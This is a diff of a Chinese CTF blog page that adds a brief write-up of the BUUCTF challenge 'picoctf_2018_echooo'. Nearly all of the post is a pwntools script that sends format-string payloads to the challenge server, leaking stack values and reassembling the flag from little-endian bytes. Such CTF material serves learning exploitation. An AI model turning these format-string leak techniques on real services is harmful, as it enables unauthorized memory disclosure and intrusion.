@@ -22,7 +22,7 @@
 
   
 
-  <title>about | 菜鸡PWN</title>
+  <title>记一个简单的方法 | 菜鸡PWN</title>
 
   
 
@@ -43,7 +43,7 @@
   <div class="root-container">
     
 <!-- header container -->
-<header class="header-container">
+<header class="header-container post">
   
     <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
   
@@ -93,37 +93,99 @@
 
   
   
-
-  
-  
     <div class="header-content">
-      <div class="post-text layout-block layout-padding">
-        <h1 class="title-wrap">about</h1>
-        
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">记一个简单的方法</h1>
+          <h2 class="title-sub-wrap">
+            <strong>LOLOLO</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2021-11-01T11:14:25.000Z" itemprop="datePublished">2021-11-01</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/PWM/">🏷️ PWM</a></li>
+  
+</ul>
+        </div>
       </div>
     </div>
+  
+
+  
   
   
 </header>
 
-    <!-- 分页(其他自定义页面) -->
+    <!-- 文章 -->
 
-<!-- 自定义页面 -->
-
+<!-- 文章内容 -->
 <div class="body-container">
   <article class="content-container layout-block post-container">
     <div class="article-info">
       
+      
+      
+      
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>菜鸡PWN</p>
+        <p>BUUCTF:picoctf_2018_echooo</p>
+<p>小端序倒叙输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28732</span>)</span><br><span class="line">offset=<span class="number">11</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(27,27+11):</span></span><br><span class="line"><span class="string">    payload=&#x27;</span>%&#123;&#125;$p<span class="number">&#x27;.f</span>ormat(str(i))</span><br><span class="line">    print payload</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">    aim=unhex(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=True).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;))</span></span><br><span class="line"><span class="string">    flag+=aim[::-1]</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">print flag</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
 
       </section>
 
       
       
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2021/11/02/ciscn-s-1/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">ciscn_s_1</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF%E9%83%A8%E5%88%86PWN/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">东华杯部分PWN</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
 
-      
-      
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
     </div>
     <div class="widget-info">
       <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -160,6 +222,8 @@
     </div>
   </div>
 </section>
+
+      
 
       
 <section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -217,7 +281,6 @@
     </div>
   </article>
 </div>
-
 
     <!-- footer container -->
 <footer id="footer" class="footer">
